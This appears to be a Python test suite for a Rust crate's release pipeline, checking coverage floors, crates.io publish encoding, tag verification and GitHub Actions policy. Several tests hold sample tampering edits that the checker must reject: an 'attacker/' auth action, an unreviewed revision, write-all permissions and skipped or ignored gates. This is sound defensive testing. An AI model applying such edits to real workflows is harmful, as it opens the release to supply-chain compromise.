#!/usr/bin/env python3
"""Regression checks for coverage and GitHub Actions release policies."""

from __future__ import annotations

import contextlib
import copy
import errno
import gzip
import hashlib
import io
import json
import os
from pathlib import Path
import re
import subprocess
import ssl
import struct
import sys
import tarfile
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parent))
import verify_llvm_coverage as coverage
import check_workflows
import prepare_crates_io_publish
import publish_release
import verify_claim_ledger as claim_ledger
import verify_release_tag


class CoverageTests(unittest.TestCase):
    def setUp(self) -> None:
        self.totals = {
            metric: {"count": 100, "covered": floor, "percent": 100}
            for metric, floor in coverage.RELEASE_FLOORS.items()
        }

    def test_exact_floors_pass_and_any_metric_below_floor_fails(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(coverage.verify(self.totals), [])
            for metric in coverage.METRICS:
                totals = copy.deepcopy(self.totals)
                totals[metric]["covered"] -= 1
                failures = coverage.verify(totals)
                self.assertEqual(len(failures), 1)
                self.assertTrue(failures[0].startswith(metric))

    def test_strict_mode_still_requires_complete_coverage(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(len(coverage.verify(self.totals, strict=True)), 4)
            for value in self.totals.values():
                value["covered"] = value["count"]
            self.assertEqual(coverage.verify(self.totals, strict=True), [])

    def test_missing_empty_negative_or_noninteger_metrics_are_rejected(self) -> None:
        for bad in [None, {}, {"count": 0, "covered": 0},
                    {"count": -1, "covered": -1}, {"count": 100, "covered": -1},
                    {"count": 100, "covered": 101}, {"count": True, "covered": 1},
                    {"count": 100, "covered": 59.0}]:
            with self.subTest(value=bad):
                totals = copy.deepcopy(self.totals)
                totals["lines"] = bad
                with self.assertRaises(ValueError):
                    coverage.verify(totals)

    def test_multiple_or_missing_aggregates_are_not_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            report = Path(directory) / "coverage.json"
            for document in [[], {}, {"data": []}, {"data": [None]},
                             {"data": [{"totals": self.totals}] * 2}]:
                report.write_text(json.dumps(document))
                with self.assertRaises(ValueError):
                    coverage.load_totals(report)
            report.write_text(json.dumps({"data": [{"totals": self.totals}]}))
            self.assertEqual(coverage.load_totals(report), self.totals)


class PublishTests(unittest.TestCase):
    def test_download_negotiates_archive_bytes_instead_of_the_json_url(self) -> None:
        version = "0.1.1"
        archive = gzip.compress(b"verified release archive", mtime=0)
        digest = hashlib.sha256(archive).hexdigest()
        metadata_url = f"{publish_release.API_ROOT}/image-slash-star/{version}"
        download_url = metadata_url + "/download"

        def serve(request, **kwargs):
            if request.full_url == metadata_url:
                self.assertEqual(request.get_header("Accept"), "application/json")
                return io.BytesIO(json.dumps({"version": {
                    "num": version, "checksum": digest,
                }}).encode())
            self.assertEqual(request.full_url, download_url)
            # The real crates.io endpoint returns a URL descriptor for JSON
            # clients, and redirects binary clients to the immutable archive.
            if request.get_header("Accept") == "application/json":
                return io.BytesIO(json.dumps({"url": "https://example.invalid/archive.crate"}).encode())
            self.assertEqual(request.get_header("Accept"), "application/octet-stream")
            return io.BytesIO(archive)

        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "release.crate"
            with patch.object(publish_release.urllib.request, "urlopen", side_effect=serve):
                self.assertEqual(publish_release.download_registry_archive(version, destination), digest)
            self.assertEqual(destination.read_bytes(), archive)

    def test_publish_request_uses_cargo_registry_length_prefixes(self) -> None:
        metadata = {
            "name": "image-slash-star",
            "vers": "0.1.3",
            "deps": [],
            "features": {"default": []},
        }
        archive = b"verified-crate-bytes"

        request = prepare_crates_io_publish.encode_publish_request(metadata, archive)
        metadata_size = struct.unpack_from("<I", request)[0]
        metadata_start = 4
        archive_size_offset = metadata_start + metadata_size
        archive_size = struct.unpack_from("<I", request, archive_size_offset)[0]

        self.assertEqual(
            json.loads(request[metadata_start:archive_size_offset]), metadata
        )
        self.assertEqual(archive_size, len(archive))
        self.assertEqual(request[archive_size_offset + 4 :], archive)

    def test_prepare_writes_the_exact_candidate_into_the_publish_request(self) -> None:
        package = {
            "name": "image-slash-star",
            "version": "0.1.3",
            "dependencies": [],
            "features": {"default": []},
        }
        archive = b"immutable candidate archive"
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = root / "image-slash-star-0.1.3.crate"
            candidate.write_bytes(archive)
            output = root / "nested" / "publish.bin"

            prepare_crates_io_publish.prepare(candidate, output, package)

            request = output.read_bytes()
        metadata_size = struct.unpack_from("<I", request)[0]
        archive_size_offset = 4 + metadata_size
        metadata = json.loads(request[4:archive_size_offset])
        archive_size = struct.unpack_from("<I", request, archive_size_offset)[0]
        self.assertEqual(metadata["name"], "image-slash-star")
        self.assertEqual(metadata["vers"], "0.1.3")
        self.assertEqual(archive_size, len(archive))
        self.assertEqual(request[archive_size_offset + 4 :], archive)

    def test_registry_metadata_rejects_a_readme_outside_the_package(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            package = {
                "name": "image-slash-star",
                "dependencies": [],
                "readme": "../README.md",
            }

            with self.assertRaisesRegex(
                prepare_crates_io_publish.PublishPayloadError,
                "readme resolves outside the package",
            ):
                prepare_crates_io_publish.registry_metadata(
                    package, package_root=Path(directory)
                )

    def test_registry_metadata_rejects_unknown_dependency_kinds(self) -> None:
        package = {
            "name": "image-slash-star",
            "dependencies": [{"name": "odd", "kind": "runtime", "req": "*"}],
        }

        with self.assertRaisesRegex(
            prepare_crates_io_publish.PublishPayloadError,
            "unsupported dependency kind",
        ):
            prepare_crates_io_publish.registry_metadata(package)

    def test_publish_request_rejects_fields_larger_than_registry_limit(self) -> None:
        with patch.object(prepare_crates_io_publish, "MAX_U32", 2):
            with self.assertRaisesRegex(
                prepare_crates_io_publish.PublishPayloadError,
                "publish request fields exceed the registry limit",
            ):
                prepare_crates_io_publish.encode_publish_request({}, b"123")

    def test_registry_metadata_maps_cargo_dependencies_and_readme(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "README.md").write_text("Release metadata\n", encoding="utf-8")
            package = {
                "name": "image-slash-star",
                "version": "0.1.3",
                "dependencies": [
                    {
                        "name": "wide",
                        "req": "^1.6.1",
                        "kind": None,
                        "rename": "simd",
                        "optional": True,
                        "uses_default_features": False,
                        "features": ["std"],
                        "target": "cfg(target_arch = \"x86_64\")",
                        "registry": None,
                    }
                ],
                "features": {"default": ["simd"]},
                "authors": ["Appunni M"],
                "description": "Codec library",
                "readme": "README.md",
                "keywords": ["image"],
                "categories": ["multimedia::images"],
                "license": "MIT OR Apache-2.0",
                "repository": "https://example.invalid/repo",
                "rust_version": "1.96.1",
            }

            metadata = prepare_crates_io_publish.registry_metadata(
                package, package_root=root
            )

        self.assertEqual(metadata["readme"], "Release metadata\n")
        self.assertEqual(metadata["readme_file"], "README.md")
        self.assertEqual(
            metadata["deps"],
            [
                {
                    "name": "wide",
                    "version_req": "^1.6.1",
                    "features": ["std"],
                    "optional": True,
                    "default_features": False,
                    "target": "cfg(target_arch = \"x86_64\")",
                    "kind": "normal",
                    "registry": None,
                    "explicit_name_in_toml": "simd",
                }
            ],
        )

    def test_repository_cargo_metadata_forms_a_registry_publish_document(self) -> None:
        metadata = prepare_crates_io_publish.registry_metadata(
            prepare_crates_io_publish.cargo_metadata()
        )

        self.assertEqual(metadata["name"], "image-slash-star")
        self.assertEqual(metadata["vers"], publish_release.package_version())
        self.assertEqual(metadata["readme_file"], "README.md")
        self.assertTrue(metadata["readme"].startswith("# image-slash-star"))
        self.assertEqual(
            {dependency["kind"] for dependency in metadata["deps"]}, {"normal"}
        )

    def test_registry_visibility_wait_retries_without_publishing(self) -> None:
        with (
            patch.object(
                publish_release,
                "registry_version",
                side_effect=[None, {"num": "0.1.3"}],
            ),
            patch.object(publish_release.time, "sleep") as sleep,
        ):
            publish_release.wait_until_visible("0.1.3")

        sleep.assert_called_once_with(5)

    def test_prepare_rejects_a_candidate_for_another_version(self) -> None:
        package = {"name": "image-slash-star", "version": "0.1.3"}
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = root / "image-slash-star-0.1.2.crate"
            candidate.write_bytes(b"archive")

            with self.assertRaisesRegex(
                prepare_crates_io_publish.PublishPayloadError,
                "expected verified candidate named",
            ):
                prepare_crates_io_publish.prepare(
                    candidate, root / "publish.bin", package
                )

    def test_download_checksum_mismatch_still_blocks_release(self) -> None:
        metadata = {"num": "0.1.1", "checksum": hashlib.sha256(b"expected archive").hexdigest()}
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "release.crate"
            with (
                patch.object(publish_release, "registry_version", return_value=metadata),
                patch.object(publish_release.urllib.request, "urlopen", return_value=io.BytesIO(b"changed archive")),
            ):
                with self.assertRaisesRegex(publish_release.PublishError, "differs from crates.io index"):
                    publish_release.download_registry_archive("0.1.1", destination)

class ReleaseTagTests(unittest.TestCase):
    def test_remote_annotated_tag_must_peel_to_the_event_commit(self) -> None:
        tag_object = "b" * 40
        commit = "a" * 40
        output = (
            f"{tag_object}\trefs/tags/v0.1.1\n"
            f"{commit}\trefs/tags/v0.1.1^{{}}\n"
        )

        def capture_command(command: list[str]) -> str:
            if command[1] == "check-ref-format":
                return ""
            return output

        self.assertEqual(
            verify_release_tag.verify_remote_tag(
                "v0.1.1", commit, capture_command=capture_command
            ),
            commit,
        )
        with self.assertRaisesRegex(verify_release_tag.ReleaseTagError, "resolves to"):
            verify_release_tag.verify_remote_tag(
                "v0.1.1", "c" * 40, capture_command=capture_command
            )

    def test_remote_lightweight_tag_is_rejected(self) -> None:
        commit = "a" * 40

        def capture_command(command: list[str]) -> str:
            if command[1] == "check-ref-format":
                return ""
            return f"{commit}\trefs/tags/v0.1.1\n"

        with self.assertRaisesRegex(verify_release_tag.ReleaseTagError, "annotated"):
            verify_release_tag.verify_remote_tag(
                "v0.1.1", commit, capture_command=capture_command
            )


class WorkflowPolicyTests(unittest.TestCase):
    VALID_RELEASE_WORKFLOW = """env:
  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"
jobs:
  release-coverage:
    steps:
      - uses: actions/checkout@123
      - uses: dtolnay/rust-toolchain@123
        with:
          toolchain: ${{ env.COVERAGE_TOOLCHAIN }}
      - run: cargo +${COVERAGE_TOOLCHAIN} install cargo-llvm-cov --locked --version 0.8.7
      - name: Measure coverage
        run: make coverage
  publish:
    needs: [preflight, release-coverage]
"""

    def test_external_actions_require_full_commit_shas(self) -> None:
        sha = "a" * 40
        contents = f"""jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - uses: "owner/action@{sha}" # pinned
      - uses: ./local/action
  reusable:
    uses: owner/repo/.github/workflows/ci.yml@v1
"""
        self.assertEqual(
            check_workflows.unpinned_action_uses(contents),
            [
                (4, "actions/checkout@v4"),
                (8, "owner/repo/.github/workflows/ci.yml@v1"),
            ],
        )

    def test_inline_flow_steps_cannot_bypass_action_pinning(self) -> None:
        contents = (
            "jobs:\n  build:\n    steps:\n"
            "      - {run: echo ok, uses: actions/checkout@v4}\n"
            "      - {\"uses\": owner/action@v1, run: echo ok}\n"
        )
        self.assertEqual(
            check_workflows.unpinned_action_uses(contents),
            [(4, "actions/checkout@v4"), (5, "owner/action@v1")],
        )

    def test_ci_manual_dispatches_use_unique_concurrency_groups(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "ci.yml")
        group = next(
            line.strip()
            for line in workflow.read_text(encoding="utf-8").splitlines()
            if line.lstrip().startswith("group:")
        )
        self.assertIn(
            "github.event_name == 'workflow_dispatch' && github.run_id",
            group,
        )

    def test_ci_supply_chain_job_has_bounded_timeout(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "ci.yml")
        contents = workflow.read_text(encoding="utf-8")
        match = re.search(
            r"(?ms)^  supply-chain:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:\s*$|\Z)",
            contents,
        )
        self.assertIsNotNone(match, "CI must retain the supply-chain job")
        self.assertRegex(match.group("body"), r"(?m)^    timeout-minutes: 20$")

    def test_windows_msvc_lane_runs_all_feature_checks_and_parity(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "ci.yml")
        contents = workflow.read_text(encoding="utf-8")
        match = re.search(
            r"(?ms)^  windows-msvc:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:\s*$|\Z)",
            contents,
        )
        self.assertIsNotNone(match, "CI must retain the Windows MSVC runtime job")
        job = match.group("body")
        self.assertIn("runs-on: windows-latest", job)
        self.assertIn('RUSTC_WRAPPER: ""', job)
        self.assertIn("run: cargo check --workspace --all-features --locked", job)
        self.assertIn(
            "run: cargo clippy --workspace --all-targets --all-features --locked -- -D warnings",
            job,
        )
        self.assertIn("run: cargo test --workspace --all-features --locked", job)
        self.assertNotRegex(job, r"(?m)^\s+(?:if|continue-on-error):")

    def test_release_coverage_is_required_before_publishing(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml")
        self.assertEqual(
            check_workflows.release_coverage_gate_violations(
                workflow.read_text(encoding="utf-8")
            ),
            [],
        )

    def test_release_cannot_publish_when_tag_coverage_is_skipped(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "needs: [preflight, release-coverage]", "needs: preflight"
        )
        self.assertEqual(
            check_workflows.release_coverage_gate_violations(workflow),
            ["publish must depend on release-coverage"],
        )

    def test_release_coverage_must_execute_make_instead_of_printing_its_name(self) -> None:
        for no_op in ('echo "make coverage"', "# make coverage"):
            with self.subTest(run=no_op):
                workflow = self.VALID_RELEASE_WORKFLOW.replace(
                    "run: make coverage", f"run: {no_op}"
                )
                self.assertIn(
                    "release-coverage must execute make coverage",
                    check_workflows.release_coverage_gate_violations(workflow),
                )

    def test_release_coverage_command_cannot_ignore_failure(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "run: make coverage", "run: make coverage || true"
        )
        self.assertIn(
            "release-coverage must not ignore make coverage failures",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_must_propagate_failures_when_errexit_is_disabled(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "run: make coverage",
            "run: |\n          set +e\n          make coverage 2>&1 | tee coverage.log\n          set -e",
        )
        self.assertIn(
            "release-coverage must propagate failures while errexit is disabled",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_job_cannot_be_conditionally_skipped(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "  release-coverage:\n",
            "  release-coverage:\n    if: github.event_name == 'workflow_dispatch'\n",
        )
        self.assertIn(
            "release-coverage must not be conditionally skipped",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_step_cannot_be_conditionally_skipped(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "      - name: Measure coverage\n",
            "      - if: false\n        name: Measure coverage\n",
        )
        self.assertIn(
            "make coverage step must not be conditionally skipped",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_publish_cannot_ignore_failed_coverage_dependencies(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "  publish:\n",
            "  publish:\n    if: always()\n",
        )
        self.assertIn(
            "publish must use the default successful-dependencies condition",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_cannot_ignore_failure(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "      - name: Measure coverage\n",
            "      - continue-on-error: true\n        name: Measure coverage\n",
        )
        self.assertIn(
            "make coverage step must not ignore failures",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_cannot_check_out_main_instead_of_the_tag(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "      - uses: actions/checkout@123\n",
            "      - uses: actions/checkout@123\n        with:\n          ref: main\n",
        )
        self.assertIn(
            "release-coverage checkout must use the tag event commit",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_ci_aggregate_coverage_runs_only_on_allowed_triggers(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "ci.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(check_workflows.ci_coverage_gate_violations(workflow), [])
        for event in ("schedule", "workflow_dispatch"):
            with self.subTest(event=event):
                self.assertTrue(check_workflows.coverage_event_is_allowed(event))
        for event in ("push", "pull_request", "workflow_run"):
            with self.subTest(event=event):
                self.assertFalse(check_workflows.coverage_event_is_allowed(event))

        widened = workflow.replace(
            "github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'",
            "always()",
        )
        self.assertIn(
            "CI aggregate coverage must run only on schedule or workflow_dispatch",
            check_workflows.ci_coverage_gate_violations(widened),
        )
        missing_manual_trigger = workflow.replace("  workflow_dispatch:\n", "")
        self.assertIn(
            "CI workflow must declare the workflow_dispatch trigger",
            check_workflows.ci_coverage_gate_violations(missing_manual_trigger),
        )
        skipped_coverage = workflow.replace(
            '          make coverage 2>&1 | tee "$log_file"',
            '          echo make coverage 2>&1 | tee "$log_file"',
        )
        self.assertIn(
            "CI aggregate coverage job must execute make coverage",
            check_workflows.ci_coverage_gate_violations(skipped_coverage),
        )

    def test_documentation_publication_uses_the_trusted_workflow_run_gate(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "docs.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(
            check_workflows.docs_workflow_run_publication_violations(workflow), []
        )

        trusted_benchmark = {
            "name": "Benchmark",
            "event": "push",
            "status": "completed",
            "conclusion": "success",
            "head_branch": "main",
            "head_repository": {"full_name": "appunni-m/image-slash-star"},
        }
        trusted_release = {
            **trusted_benchmark,
            "name": "Release",
            "event": "push",
            "head_branch": "v0.1.0",
        }
        self.assertTrue(
            check_workflows.docs_workflow_run_is_publishable(
                "workflow_run", trusted_benchmark, "appunni-m/image-slash-star"
            )
        )
        self.assertTrue(
            check_workflows.docs_workflow_run_is_publishable(
                "workflow_run", trusted_release, "appunni-m/image-slash-star"
            )
        )

        rejected_runs = [
            ("push", trusted_benchmark),
            ("workflow_run", {**trusted_benchmark, "status": "in_progress"}),
            ("workflow_run", {**trusted_benchmark, "conclusion": "failure"}),
            (
                "workflow_run",
                {
                    **trusted_benchmark,
                    "head_repository": {"full_name": "fork/image-slash-star"},
                },
            ),
            ("workflow_run", {**trusted_benchmark, "head_branch": "feature/docs"}),
            ("workflow_run", {**trusted_release, "event": "workflow_dispatch"}),
            ("workflow_run", {**trusted_release, "head_branch": "main"}),
            ("workflow_run", {**trusted_benchmark, "name": "Other workflow"}),
        ]
        for event_name, run in rejected_runs:
            with self.subTest(event_name=event_name, run=run):
                self.assertFalse(
                    check_workflows.docs_workflow_run_is_publishable(
                        event_name, run, "appunni-m/image-slash-star"
                    )
                )

    def test_documentation_gate_rejects_policy_broadening(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "docs.yml").read_text(
            encoding="utf-8"
        )
        mutations = (
            (
                "github.event.workflow_run.conclusion == 'success'",
                "github.event.workflow_run.conclusion == 'failure'",
            ),
            (
                "github.event.workflow_run.head_repository.full_name == github.repository",
                "github.event.workflow_run.head_repository.full_name != github.repository",
            ),
            (
                "github.event.workflow_run.head_branch == 'main'",
                "github.event.workflow_run.head_branch == 'preview'",
            ),
            (
                "startsWith(github.event.workflow_run.head_branch, 'v')",
                "startsWith(github.event.workflow_run.head_branch, 'release-')",
            ),
        )
        for before, after in mutations:
            with self.subTest(mutation=before):
                self.assertIn(before, workflow)
                broadened = workflow.replace(before, after)
                self.assertTrue(
                    check_workflows.docs_workflow_run_publication_violations(
                        broadened
                    )
                )

        concurrency_start = workflow.index("concurrency:\n")
        jobs_start = workflow.index("jobs:\n", concurrency_start)
        concurrency = workflow[concurrency_start:jobs_start]
        broadened_concurrency = concurrency.replace(
            "github.event_name == 'workflow_run' &&",
            "github.event_name == 'push' &&",
            1,
        )
        broadened_workflow = (
            workflow[:concurrency_start]
            + broadened_concurrency
            + workflow[jobs_start:]
        )
        self.assertTrue(
            check_workflows.docs_workflow_run_publication_violations(
                broadened_workflow
            )
        )

        deploy_start = workflow.index("  deploy:\n")
        examples_start = workflow.index("  examples:\n", deploy_start)
        deploy_job = workflow[deploy_start:examples_start]
        bypassed = deploy_job.replace(
            "github.event_name != 'workflow_run' ||", "always() ||"
        )
        self.assertNotEqual(deploy_job, bypassed)
        bypassed_workflow = workflow[:deploy_start] + bypassed + workflow[examples_start:]
        self.assertTrue(
            check_workflows.docs_workflow_run_publication_violations(
                bypassed_workflow
            )
        )

    def test_release_preflight_rebuilds_only_after_candidate_download_failure(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "release.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(
            check_workflows.release_candidate_fallback_violations(workflow), []
        )

        missing_run_guard = workflow.replace('          test -n "$run_id"\n', "")
        self.assertIn(
            "release preflight must select successful main CI for the exact tagged commit",
            check_workflows.release_candidate_fallback_violations(missing_run_guard),
        )
        missing_download_recovery = workflow.replace(
            "        continue-on-error: true\n        uses: actions/download-artifact@",
            "        uses: actions/download-artifact@",
        )
        self.assertIn(
            "candidate download failure must enable the verified rebuild",
            check_workflows.release_candidate_fallback_violations(
                missing_download_recovery
            ),
        )
        wrong_fallback = workflow.replace(
            "if: steps.candidate-artifact.outcome == 'failure'",
            "if: always()",
        )
        self.assertIn(
            "candidate rebuild must run only when artifact download fails",
            check_workflows.release_candidate_fallback_violations(wrong_fallback),
        )
        unverified_fallback = workflow.replace(
            "RELEASE_TAG=\"$GITHUB_REF_NAME\" make package-verify PYTHON=python3",
            "make package-verify PYTHON=python3",
        )
        self.assertIn(
            "candidate rebuild must run tagged package verification",
            check_workflows.release_candidate_fallback_violations(unverified_fallback),
        )
        wrong_download_source = workflow.replace(
            "run-id: ${{ steps.ci-run.outputs.run-id }}",
            "run-id: ${{ github.run_id }}",
        )
        self.assertIn(
            "candidate download must use the successful main CI run",
            check_workflows.release_candidate_fallback_violations(wrong_download_source),
        )

        fallback_start = workflow.index(
            "      - name: Rebuild and verify the candidate when the CI artifact is unavailable\n"
        )
        checksum_start = workflow.index("      - name: Verify candidate bundle\n")
        upload_start = workflow.index("      - name: Retain verified candidate bundle\n")
        fallback_step = workflow[fallback_start:checksum_start]
        checksum_step = workflow[checksum_start:upload_start]
        reordered = (
            workflow[:fallback_start]
            + checksum_step
            + fallback_step
            + workflow[upload_start:]
        )
        self.assertIn(
            "candidate checksum must run after the download/rebuild paths",
            check_workflows.release_candidate_fallback_violations(reordered),
        )


class WorkflowDownloadTests(unittest.TestCase):
    def test_only_tls_eof_is_retried(self) -> None:
        self.assertTrue(
            check_workflows.is_transient_download_failure(
                ssl.SSLEOFError("unexpected end of file")
            )
        )
        self.assertFalse(
            check_workflows.is_transient_download_failure(
                ssl.SSLCertVerificationError("certificate verification failed")
            )
        )

    def test_download_retries_transient_transport_error_then_succeeds(self) -> None:
        archive = b"checksum-verified-by-caller"
        response = io.BytesIO(archive)
        with (
            patch.object(
                check_workflows.urllib.request,
                "urlopen",
                side_effect=[
                    check_workflows.urllib.error.URLError(
                        ConnectionResetError(errno.ECONNRESET, "connection reset")
                    ),
                    check_workflows.urllib.error.URLError(
                        ConnectionResetError(errno.ECONNRESET, "connection reset")
                    ),
                    response,
                ],
            ) as urlopen,
            patch.object(check_workflows.time, "sleep") as sleep,
        ):
            downloaded = check_workflows.download_archive("https://example.test/archive")

        self.assertEqual(downloaded, archive)
        self.assertEqual(urlopen.call_count, 3)
        self.assertEqual(
            [call.args[0] for call in sleep.call_args_list],
            [
                check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS,
                2 * check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS,
            ],
        )

    def test_release_oidc_boundary_accepts_current_workflow(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml")
        self.assertEqual(
            check_workflows.release_oidc_isolation_violations(
                workflow.read_text(encoding="utf-8")
            ),
            [],
        )

    def test_release_oidc_jobs_reject_unreviewed_step_controls(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        mutations = [
            (
                "skip publisher tag verification",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        if: false\n",
            ),
            (
                "ignore publisher tag verification failure",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        continue-on-error: true\n",
            ),
            (
                "skip release attestation",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        if: false\n",
            ),
            (
                "ignore release attestation failure",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        continue-on-error: true\n",
            ),
            (
                "run tag verification despite earlier failures",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        if: always()\n",
            ),
            (
                "quoted publisher condition",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        \"if\": github.event_name == 'workflow_dispatch'\n",
            ),
            (
                "quoted publisher continue-on-error key",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        \"continue-on-error\": true\n",
            ),
            (
                "tagged publisher condition",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        !!str if: github.event_name == 'workflow_dispatch'\n",
            ),
            (
                "tagged attestation failure handling",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        !!str continue-on-error: true\n",
            ),
            (
                "folded authentication condition",
                "      - name: Authenticate to crates.io with OIDC\n"
                "        id: crates-io-auth\n"
                "        if: steps.existing-version.outputs.present != 'true'\n",
                "      - name: Authenticate to crates.io with OIDC\n"
                "        id: crates-io-auth\n"
                "        if: steps.existing-version.outputs.present != 'true'\n"
                "          && always()\n",
            ),
            (
                "folded upload condition",
                "      - name: Upload the verified archive to crates.io\n"
                "        if: steps.existing-version.outputs.present != 'true'\n",
                "      - name: Upload the verified archive to crates.io\n"
                "        if: steps.existing-version.outputs.present != 'true'\n"
                "          && always()\n",
            ),
            (
                "duplicate the publisher condition",
                "        if: steps.existing-version.outputs.present != 'true'\n",
                "        if: steps.existing-version.outputs.present != 'true'\n"
                "        if: steps.existing-version.outputs.present != 'true'\n",
            ),
        ]

        for case, old, new in mutations:
            with self.subTest(case=case):
                unsafe = workflow.replace(old, new, 1)
                self.assertNotEqual(unsafe, workflow)
                self.assertIn(
                    "github-release step controls must match the reviewed policy"
                    if (
                        "attestation" in case
                        or "tag verification despite" in case
                    )
                    else "publish step controls must match the reviewed policy",
                    check_workflows.release_oidc_isolation_violations(unsafe),
                )

    def test_release_oidc_jobs_reject_job_level_control_overrides(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        mutations = [
            (
                "github-release always condition",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    if: always()\n"
                "    runs-on: ubuntu-24.04\n",
            ),
            (
                "github-release ignored failures",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    continue-on-error: true\n"
                "    runs-on: ubuntu-24.04\n",
            ),
            (
                "quoted github-release condition",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    \"if\": always()\n"
                "    runs-on: ubuntu-24.04\n",
            ),
            (
                "tagged github-release condition",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    !!str if: always()\n"
                "    runs-on: ubuntu-24.04\n",
            ),
        ]

        for case, old, new in mutations:
            with self.subTest(case=case):
                unsafe = workflow.replace(old, new, 1)
                self.assertNotEqual(unsafe, workflow)
                self.assertIn(
                    "github-release job controls must match the reviewed policy",
                    check_workflows.release_oidc_isolation_violations(unsafe),
                )

    def test_release_publisher_rejects_unreviewed_oidc_action(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "uses: rust-lang/crates-io-auth-action@",
            "uses: attacker/crates-io-auth-action@",
            1,
        )

        self.assertIn(
            "publish may use only the reviewed artifact and crates.io OIDC action revisions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_publisher_rejects_an_unreviewed_action_revision(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        prefix, publisher = workflow.split("  publish:", 1)
        unsafe = prefix + "  publish:" + publisher.replace(
            "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
            "actions/download-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            1,
        )

        self.assertIn(
            "publish may use only the reviewed artifact and crates.io OIDC action revisions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_workflow_rejects_global_write_all_permissions(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "permissions:\n  contents: read\n",
            "permissions: write-all\n",
            1,
        )

        self.assertIn(
            "release workflow must use only the reviewed top-level contents: read permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

